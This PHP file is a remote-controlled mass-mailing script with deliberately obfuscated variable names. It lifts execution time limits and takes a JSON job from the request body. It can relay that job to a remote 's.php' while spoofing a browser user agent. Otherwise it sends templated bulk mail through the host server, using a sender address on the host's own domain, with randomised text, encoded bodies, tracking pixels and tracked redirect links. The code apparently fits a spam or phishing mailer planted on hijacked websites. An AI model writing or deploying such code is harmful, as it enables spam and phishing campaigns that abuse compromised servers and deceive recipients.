<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spbffc38) { if ($spbffc38 == 'keys') { return array_keys($this->_keys); } } public function Import($spbffc38, $sp08e507) { if (is_array($sp08e507)) { $this->values[$spbffc38] = array(); foreach ($sp08e507 as $spe52f36) { if (!empty($spe52f36['key'])) { $this->values[$spbffc38][$spe52f36['key']] = $spe52f36['value']; } else { $this->values[$spbffc38][] = $spe52f36['value']; } } } else { $this->Assign($spbffc38, $sp08e507); } } public function Assign($spbffc38, $sp921a93) { $this->values[$spbffc38] = $sp921a93; } public function Parse($sp43fcef) { $sp78a435 = ''; $spcbd46f = 0; while (true) { $sp23eebc = strpos($sp43fcef, '{', $spcbd46f); if ($sp23eebc === false) { $sp78a435 .= substr($sp43fcef, $spcbd46f); break; } $sp78a435 .= substr($sp43fcef, $spcbd46f, $sp23eebc - $spcbd46f); $spcbd46f = $sp23eebc + 1; $sp75ac1f = ''; $spe34b51 = '{'; $speae154 = array(); $sp837fb8 = false; $sp2cb02b = false; $sp0da7b4 = 'var'; while ($spcbd46f < strlen($sp43fcef)) { $spdcff1f = substr($sp43fcef, $spcbd46f, 1); $spe34b51 .= $spdcff1f; if ($spdcff1f == ',' || $spdcff1f == '>' || $spdcff1f == '|') { if ($sp0da7b4 == 'alias') { $sp837fb8 = $sp75ac1f; } elseif ($sp0da7b4 == 'mod') { $sp2cb02b = $sp75ac1f; } else { $speae154[] = $sp75ac1f; } $sp75ac1f = ''; if ($spdcff1f == '>') { $sp0da7b4 = 'alias'; } if ($spdcff1f == '|') { $sp0da7b4 = 'mod'; } $spcbd46f++; continue; } if ($spdcff1f == '}') { if ($sp0da7b4 == 'alias') { $sp837fb8 = $sp75ac1f; } elseif ($sp0da7b4 == 'mod') { $sp2cb02b = $sp75ac1f; } else { $speae154[] = $sp75ac1f; } $spcbd46f++; break; } $sp75ac1f .= $spdcff1f; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spdcff1f) == 0) { $spcbd46f++; $speae154 = array(); break; } $spcbd46f++; } if (sizeof($speae154) == 0) { $sp78a435 .= $spe34b51; continue; } $sp0bd897 = false; $sp3d6e7e = false; if (preg_match('/^\\^/', $speae154[0]) > 0) { $speae154[0] = substr($speae154[0], 1); $sp0bd897 = true; } if (preg_match('/^\\!/', $speae154[0]) > 0) { $speae154[0] = substr($speae154[0], 1); $sp3d6e7e = true; } $spf3f355 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $speae154[0], $sp8dedae) > 0) { $spf3f355 = $sp8dedae[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $speae154[0], $sp8dedae) > 0) { $spf3f355 = explode('-', $sp8dedae[1]); } if ($spf3f355 !== false) { $speae154[0] = substr($speae154[0], 0, strpos($speae154[0], '[')); } $this->_keys[$speae154[0]] = true; if (empty($this->values[$speae154[0]])) { continue; } if ($sp0bd897) { unset($this->fixed[$speae154[0]]); } if (isset($this->fixed[$speae154[0]])) { $sp8706bb = $this->fixed[$speae154[0]]; } else { $sp8706bb = ''; $sp2debf5 = 1; if (sizeof($speae154) == 2) { $sp2debf5 = $speae154[1]; } if (sizeof($speae154) == 3) { $sp2debf5 = rand($speae154[1], $speae154[2]); } for ($spe24f1b = 0; $spe24f1b < $sp2debf5; $spe24f1b++) { if (is_array($this->values[$speae154[0]])) { if (!is_array($this->used[$speae154[0]])) { $this->used[$speae154[0]] = array(); } if (count($this->used[$speae154[0]]) == count($this->values[$speae154[0]])) { $this->used[$speae154[0]] = array(); } if ($spf3f355 !== false && is_scalar($spf3f355)) { $sp8706bb .= $this->values[$speae154[0]][$spf3f355]; $this->used[$spf3f355] = true; } else { $sp040137 = array(); if (is_array($spf3f355)) { $sp430afe = $spf3f355[0]; $sp0684fe = $spf3f355[1]; } else { $sp430afe = 0; $sp0684fe = count($this->values[$speae154[0]]) - 1; } for ($spee1226 = $sp430afe; $spee1226 <= $sp0684fe; $spee1226++) { if ($sp3d6e7e && !empty($this->used[$speae154[0]][$spee1226])) { continue; } $sp040137[] = $spee1226; } $spa58b19 = $sp040137[rand(0, count($sp040137) - 1)]; $this->used[$speae154[0]][$spa58b19] = true; $sp8706bb .= $this->values[$speae154[0]][$spa58b19]; } } else { $sp8706bb .= $this->values[$speae154[0]]; } } } $sp8706bb = $this->Parse($sp8706bb); if ($sp2cb02b !== false) { for ($spe46810 = 0; $spe46810 < strlen($sp2cb02b); $spe46810++) { switch (substr($sp2cb02b, $spe46810, 1)) { case 'b': $sp8706bb = base64_encode($sp8706bb); break; case 'q': $sp8706bb = quoted_printable_encode($sp8706bb); break; default: break; } } } if ($sp0bd897) { $this->fixed[$speae154[0]] = $sp8706bb; } if ($sp837fb8 !== false && $sp837fb8 != '') { $this->fixed[$sp837fb8] = $sp8706bb; } $sp78a435 .= $sp8706bb; } return $sp78a435; } } $spe9d97f = file_get_contents('php://input'); $sp890854 = json_decode($spe9d97f, true); if (empty($sp890854['via_proxy'])) { $sp890854['via_proxy'] = true; $spdc9570 = curl_init($sp890854['prefix'] . 's.php'); $spf1d954 = json_encode($sp890854); curl_setopt($spdc9570, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spdc9570, CURLOPT_TIMEOUT, 600); curl_setopt($spdc9570, CURLOPT_RETURNTRANSFER, true); curl_setopt($spdc9570, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spdc9570, CURLOPT_REFERER, $sp94c4ef); curl_setopt($spdc9570, CURLOPT_POST, true); curl_setopt($spdc9570, CURLOPT_POSTFIELDS, $spf1d954); curl_setopt($spdc9570, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spf1d954))); $sp317b35 = curl_exec($spdc9570); echo $sp317b35; die; } $spa3da84 = $_SERVER['SERVER_ADDR']; $sp73ae10 = $_SERVER['HTTP_HOST']; $sp73ae10 = preg_replace('/^www\\./', '', $sp73ae10); $sp1ae7c1 = new Macros(); $sp1ae7c1->Assign('server_addr', $spa3da84); $sp1ae7c1->Assign('server_host', $sp73ae10); foreach ($sp890854['macros'] as $spbffc38 => $sp08e507) { $sp1ae7c1->Import($spbffc38, $sp08e507); } $spa4e797 = preg_replace('/^www\\./i', '', $sp73ae10); $sp28a0ef = $sp1ae7c1->Parse('{from_user}@' . $spa4e797); $sp1ae7c1->Assign('from_email', $sp28a0ef); $sp1ae7c1->Assign('prefix', $sp890854['prefix']); $sp1ae7c1->Assign('html', $sp890854['letter']['html']); $spcbd46f = 0; $spce6cac = 0; $sp4ef20f = 0; $spb14ba3 = array(); foreach ($sp890854['rcpt'] as $sp8bc686) { $sp1ae7c1->Assign('email', $sp8bc686['email']); $sp1ae7c1->Assign('entry', $sp8bc686); $sp1ae7c1->Assign('date', date('r')); $sp1ae7c1->Assign('redirect', $sp890854['prefix'] . 'r.php?id=' . $sp8bc686['id'] . '&uri='); $sp1ae7c1->Assign('unsubscribe', $sp890854['prefix'] . 'u.php?id=' . $sp8bc686['id']); $sp1ae7c1->Assign('delivery', '<img src="' . $sp890854['prefix'] . 'd.php?id=' . $sp8bc686['id'] . '" />'); $spd542dd = $sp1ae7c1->Parse($sp890854['envelope']['header']); $spf62b01 = $sp1ae7c1->Parse($sp890854['envelope']['body']); if (!empty($sp8bc686['name'])) { $sp253506 = $sp8bc686['name'] . ' <' . $sp8bc686['email'] . '>'; } else { $sp253506 = $sp8bc686['email']; } $sp4c1fef = $sp1ae7c1->Parse($sp890854['letter']['subject']); $spc34e98 = mail($sp253506, $sp4c1fef, $spf62b01, $spd542dd); $spb14ba3[$sp8bc686['id']] = $spc34e98; if ($spc34e98) { $spce6cac++; } else { $sp4ef20f++; } $spcbd46f++; } echo serialize(array('total' => count($sp890854['rcpt']), 'sent' => $spcbd46f, 'success' => $spce6cac, 'error' => $sp4ef20f, 'rcpt' => $spb14ba3));